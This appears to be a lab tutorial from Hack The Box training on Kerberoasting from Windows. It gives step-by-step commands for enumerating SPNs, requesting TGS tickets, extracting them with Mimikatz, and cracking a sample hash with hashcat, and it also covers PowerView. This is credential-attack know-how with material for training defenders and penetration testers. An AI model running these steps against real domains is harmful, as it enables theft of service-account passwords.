## Table of Contents

  - [Table of Contents](#Table\of\Contents)
  - [Kerberoasting - Semi Manual method](#Kerberoasting\-\Semi\Manual\method)
      - [Enumerating SPNs with setspn.exe](#Enumerating\SPNs\with\setspn.exe)
      - [Targeting a Single User](#Targeting\a\Single\User)
      - [Retrieving All Tickets Using setspn.exe](#Retrieving\All\Tickets\Using\setspn.exe)
      - [Retrieving All Tickets Using setspn.exe](#Retrieving\All\Tickets\Using\setspn.exe)
  - [Extracting Tickets from Memory with Mimikatz](#Extracting\Tickets\from\Memory\with\Mimikatz)
      - [Preparing the Base64 Blob for Cracking](#Preparing\the\Base64\Blob\for\Cracking)
      - [Placing the Output into a File as .kirbi](#Placing\the\Output\into\a\File\as\.kirbi)
      - [Extracting the Kerberos Ticket using kirbi2john.py](#Extracting\the\Kerberos\Ticket\using\kirbi2john.py)
      - [Modifiying crack_file for Hashcat](#Modifiying\crack_file\for\Hashcat)
      - [Viewing the Prepared Hash](#Viewing\the\Prepared\Hash)
      - [Cracking the Hash with Hashcat](#Cracking\the\Hash\with\Hashcat)
  - [Automated / Tool Based Route](#Automated\/\Tool\Based\Route)
      - [Using PowerView to Extract TGS Tickets](#Using\PowerView\to\Extract\TGS\Tickets)
      - [Using PowerView to Target a Specific User](#Using\PowerView\to\Target\a\Specific\User)
      - [Exporting All Tickets to a CSV File](#Exporting\All\Tickets\to\a\CSV\File)

## Table of Contents

  - [Kerberoasting - Semi Manual method](#Kerberoasting\-\Semi\Manual\method)
      - [Enumerating SPNs with setspn.exe](#Enumerating\SPNs\with\setspn.exe)
      - [Targeting a Single User](#Targeting\a\Single\User)
      - [Retrieving All Tickets Using setspn.exe](#Retrieving\All\Tickets\Using\setspn.exe)
      - [Retrieving All Tickets Using setspn.exe](#Retrieving\All\Tickets\Using\setspn.exe)
  - [Extracting Tickets from Memory with Mimikatz](#Extracting\Tickets\from\Memory\with\Mimikatz)
      - [Preparing the Base64 Blob for Cracking](#Preparing\the\Base64\Blob\for\Cracking)
      - [Placing the Output into a File as .kirbi](#Placing\the\Output\into\a\File\as\.kirbi)
      - [Extracting the Kerberos Ticket using kirbi2john.py](#Extracting\the\Kerberos\Ticket\using\kirbi2john.py)
      - [Modifiying crack_file for Hashcat](#Modifiying\crack_file\for\Hashcat)
      - [Viewing the Prepared Hash](#Viewing\the\Prepared\Hash)
      - [Cracking the Hash with Hashcat](#Cracking\the\Hash\with\Hashcat)
  - [Automated / Tool Based Route](#Automated\/\Tool\Based\Route)
      - [Using PowerView to Extract TGS Tickets](#Using\PowerView\to\Extract\TGS\Tickets)
      - [Using PowerView to Target a Specific User](#Using\PowerView\to\Target\a\Specific\User)
      - [Exporting All Tickets to a CSV File](#Exporting\All\Tickets\to\a\CSV\File)

## Kerberoasting - Semi Manual method

Before tools such as `Rubeus` existed, stealing or forging Kerberos tickets was a complex, manual process. As the tactic and defenses have evolved, we can now perform Kerberoasting from Windows in multiple ways. To start down this path, we will explore the manual route and then move into more automated tooling. Let's begin with the built-in [setspn](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11)) binary to enumerate SPNs in the domain.

#### Enumerating SPNs with setspn.exe

  Enumerating SPNs with setspn.exe

```cmd-session
C:\htb> setspn.exe -Q */*
```


We will notice many different SPNs returned for the various hosts in the domain. We will focus on `user accounts` and ignore the computer accounts returned by the tool. Next, using PowerShell, we can request TGS tickets for an account in the shell above and load them into memory. Once they are loaded into memory, we can extract them using `Mimikatz`. Let's try this by targeting a single user:

#### Targeting a Single User

  Targeting a Single User

```powershell-session
PS C:\htb> Add-Type -AssemblyName System.IdentityModel
PS C:\htb> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"

```



Before moving on, let's break down the commands above to see what we are doing (which is essentially what is used by [Rubeus](https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1) when using the default Kerberoasting method):

- The [Add-Type](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/add-type?view=powershell-7.2) cmdlet is used to add a .NET framework class to our PowerShell session, which can then be instantiated like any .NET framework object
- The `-AssemblyName` parameter allows us to specify an assembly that contains types that we are interested in using
- [System.IdentityModel](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel?view=netframework-4.8) is a namespace that contains different classes for building security token services
- We'll then use the [New-Object](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/new-object?view=powershell-7.2) cmdlet to create an instance of a .NET Framework object
- We'll use the [System.IdentityModel.Tokens](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens?view=netframework-4.8) namespace with the [KerberosRequestorSecurityToken](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens.kerberosrequestorsecuritytoken?view=netframework-4.8) class to create a security token and pass the SPN name to the class to request a Kerberos TGS ticket for the target account in our current logon session

We can also choose to retrieve all tickets using the same method, but this will also pull all computer accounts, so it is not optimal.

#### Retrieving All Tickets Using setspn.exe

#### Retrieving All Tickets Using setspn.exe

  Retrieving All Tickets Using setspn.exe

```powershell-session
PS C:\htb> setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

```

## Extracting Tickets from Memory with Mimikatz

  Retrieving All Tickets Using setspn.exe

```cmd-session
Using 'mimikatz.log' for logfile : OK

mimikatz # base64 /out:true
isBase64InterceptInput  is false
isBase64InterceptOutput is true

mimikatz # kerberos::list /export  

<SNIP>
```




If we do not specify the `base64 /out:true` command, Mimikatz will extract the tickets and write them to `.kirbi` files. Depending on our position on the network and if we can easily move files to our attack host, this can be easier when we go to crack the tickets. Let's take the base64 blob retrieved above and prepare it for cracking.

Next, we can take the base64 blob and remove new lines and white spaces since the output is column wrapped, and we need it all on one line for the next step.

#### Preparing the Base64 Blob for Cracking

  Preparing the Base64 Blob for Cracking

```shell-session
gdxqpardo@htb[/htb]$ echo "<base64 blob>" |  tr -d \\n 
```


#### Placing the Output into a File as .kirbi

  Placing the Output into a File as .kirbi

```shell-session
gdxqpardo@htb[/htb]$ cat encoded_file | base64 -d > sqldev.kirbi
```

Next, we can use [this](https://raw.githubusercontent.com/nidem/kerberoast/907bf234745fe907cf85f3fd916d1c14ab9d65c0/kirbi2john.py) version of the `kirbi2john.py` tool to extract the Kerberos ticket from the TGS file.

#### Extracting the Kerberos Ticket using kirbi2john.py

  Extracting the Kerberos Ticket using kirbi2john.py

```shell-session
gdxqpardo@htb[/htb]$ python2.7 kirbi2john.py sqldev.kirbi
```

This will create a file called `crack_file`. We then must modify the file a bit to be able to use Hashcat against the hash.

#### Modifiying crack_file for Hashcat

  Modifiying crack_file for Hashcat

```shell-session
gdxqpardo@htb[/htb]$ sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```

Now we can check and confirm that we have a hash that can be fed to Hashcat.

#### Viewing the Prepared Hash

  Viewing the Prepared Hash

```shell-session
gdxqpardo@htb[/htb]$ cat sqldev_tgs_hashcat 

$krb5tgs$23$*sqldev.kirbi*$813149fb261549a6a1b4965ed49d1ba8$7a8c91b47c534bc258d5c97acf433841b2ef2478b425865dc75c39b1dce7f50dedcc29fc8a97aef8d51a22c5720ee614fcb646e28d854bcdc2c8b362bbfaf62dcd9933c55efeba9d77e4c6c6f524afee5c68dacfcb6607291a20cdfb0ef144055356a7296e33b440754be7f87754ac2e4858348e2aebb7270b2d345047f880e17acc07e27a8f752c372bc83a62d54208d12288893d32afd210191dd3b2c56797bd1a72e35a73a7820be51fbf277b83d8181fff5a05cf21481a7b462ceb01c3761c50952689ed1099827c17c2934131db71bc5142c589cd70ed2ebf57dca3f6226f3b21849529355414433210b8d7bd76fec4eb68a45deebc3e7cc931ed8769328536769123f5040d6771915cdbc6c90164669fac72d23a631fef25804b5c8ec39680a4cc2959929edce34bbee6aff135bcbbb26a41a4b4e88b936896d4662ac849f56d7d68071be139cf4dfaf66497015297f9b44cdaef096c8d00255ec3e62f7105d905d0b2f39cef83db4d812718f95e8c99129f3207b386b4c32f7d57befd411e19c218148d19028eb0103d6be99ae23a454f6f3b0339d00d27879f342598937596cadad068ac3d815952a053f87d87b2584784b9d83050eea9a7c6474cde26c90f4a3546076a40ed374d004c465f654623499ca14e9c11538012cf00dee315e2ed444293822502d7f685022e61f3568e1db25b5cfe5a89b33878b6e3db05e9d91ad63820fcb7d0449e66add13f1efceddda95339db3dc919f1caff9690e54b3e4f9a8cf6998a9f9bf55c7a2ed2c87382e9da60f7ca3c22e08cc359f3ef6f4603a5af2fc28303bf3602ab9bc52026e58c27fb247fd4210f45244fd71484685b837fe9573a53964d54acfde7f963028764e99bea7b77139cb651328e862e43d894638288eace99b6d4f8b6684150db9adc43254143b77f32ebe6fbe309dde3b78305fdf0fe60505f9000b89c67c75ef6dd425e04fbe3a5ebf2d78a11a392d815a29ef48d9457fb6c780eb4cc07dfa68c2e97054788952f5ad92ca8d062e4a68967860302fd9630174af832e599bb5fca9cf341d7a1176868d9073796dffbd48efe99b222f4274e93066de646b3c60d1dd94072dd121dd0706024d11738a75ebeb5b7865a5505220d0f03aea6d359a17f3c5b6424989b31b6e52d1c558393aa34e81204fb107374a8884dcb16f6c59a76a0022004fd921734b8719e8694ba0d7f87eb46f5607af4eb1c681b6b5140dbc94a9ea7f5db6ae4c71fbc1024a25b77ac00bdc549d66373d390643be8f1007930a4124e99d4fcb6177dbd5669fb06170d3b8a75db9928164b55e454d08e77f917b1dd2e648d9c7eb0cb2b8ca0eff8a44d1ea5fdd67e01da79047a4a1406f761f5e3b6944cebed45379ea14e7a027c843fa405c07c8385a2102f07967a7cb4883f44ee72d4aa7a38b2701e77374016a01193f5b178e34f4cf2d8eadf651e162569eb421c74e8d5e0cc1a9fab58a4b9b63babb09efc3427e1667f9c7731bcabe3645986040a7306924df5e6e68655e7b0e2e88e7ce0281e0f554de82d9de6c4d9c8d2a36fce65bbb337a415030ce1d03c00fd9783afb5df0ee8fbabfa358521ad845e6d07fde7d34f2311ebae6e6a119d60d899467a66f997c273d2df73350f2d6c5438e71a057feeab
```

We can then run the ticket through Hashcat again and get the cleartext password `database!`.

#### Cracking the Hash with Hashcat

  Cracking the Hash with Hashcat

```shell-session
gdxqpardo@htb[/htb]$ hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt 
```


If we decide to skip the base64 output with Mimikatz and type `mimikatz # kerberos::list /export`, the .kirbi file (or files) will be written to disk. In this case, we can download the file(s) and run `kirbi2john.py` against them directly, skipping the base64 decoding step.

Now that we have seen the older, more manual way to perform Kerberoasting from a Windows machine and offline processing, let's look at some quicker ways. Most assessments are time-boxed, and we often need to work as quickly and efficiently as possible, so the above method will likely not be our go-to every time. That being said, it can be useful for us to have other tricks up our sleeves and methodologies in case our automated tools fail or are blocked.

---

## Automated / Tool Based Route

Next, we'll cover two much quicker ways to perform Kerberoasting from a Windows host. First, let's use [PowerView](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1) to extract the TGS tickets and convert them to Hashcat format. We can start by enumerating SPN accounts.

#### Using PowerView to Extract TGS Tickets

  Using PowerView to Extract TGS Tickets

```powershell-session
PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> Get-DomainUser * -spn | select samaccountname
```

From here, we could target a specific user and retrieve the TGS ticket in Hashcat format.

#### Using PowerView to Target a Specific User

  Using PowerView to Target a Specific User

```powershell-session
PS C:\htb> Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat

```


Finally, we can export all tickets to a CSV file for offline processing.

#### Exporting All Tickets to a CSV File

  Exporting All Tickets to a CSV File

```powershell-session
PS C:\htb> Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```


